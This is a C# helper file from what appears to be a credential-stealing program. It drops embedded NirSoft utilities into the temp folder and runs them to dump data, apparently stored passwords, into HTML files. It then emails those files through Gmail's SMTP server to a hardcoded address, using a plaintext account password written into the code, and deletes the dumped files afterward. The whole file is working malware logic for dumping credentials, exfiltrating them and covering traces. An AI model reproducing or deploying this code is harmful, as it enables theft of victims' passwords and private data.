using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net.Mail;

namespace TP
{
    internal class Helpers
    {

        public static List<string> ApplyDataExtractionActions(List<DataExtractor> dataExtractors, List<string> nirsoftExecutablePaths)
        {
            List<string> extractedDataFiles = new List<string>();
            foreach (DataExtractor dataExtractor in dataExtractors)
                extractedDataFiles.Add(dataExtractor.ExtractDataAndGetFileName());

            foreach (string resource in nirsoftExecutablePaths)
                extractedDataFiles.Add(Helpers.ExecNirsoftTool(resource));

            return extractedDataFiles;
        }

        public static void RemoveFiles(List<string> files)
        {
            foreach (string filePath in files)
                File.Delete(filePath);
        }

        public static string ExecNirsoftTool(string nirsoftTool)
        {
            string path = Path.Combine(Path.GetTempPath(), nirsoftTool + ".exe");
            File.WriteAllBytes(path, (byte[]) TP.Properties.Resources.ResourceManager.GetObject(nirsoftTool));

            string file = path.Replace("exe", "html");
            ProcessStartInfo startInfo = new ProcessStartInfo();
            startInfo.FileName = path;
            startInfo.Arguments = @"/shtml " + file;
            var process = Process.Start(startInfo);
            process.WaitForExit();

            return file;
        }

        public static void SendMail(string subject, string message, List<string> files)
        {
            MailMessage mail = new MailMessage();
            SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
            mail.From = new MailAddress("seginf2019@gmail.com");
            mail.To.Add("seginf2019@gmail.com");
            mail.Subject = subject;
            mail.Body = message;

            foreach (var file in files)
            {
                var attachment = new System.Net.Mail.Attachment(Path.Combine(AppDomain.CurrentDomain.BaseDirectory, file));
                mail.Attachments.Add(attachment);
            }

            SmtpServer.Port = 587;
            SmtpServer.Credentials = new System.Net.NetworkCredential("seginf2019@gmail.com", "sonrisita");
            SmtpServer.EnableSsl = true;

            SmtpServer.Send(mail);
        }

    }
}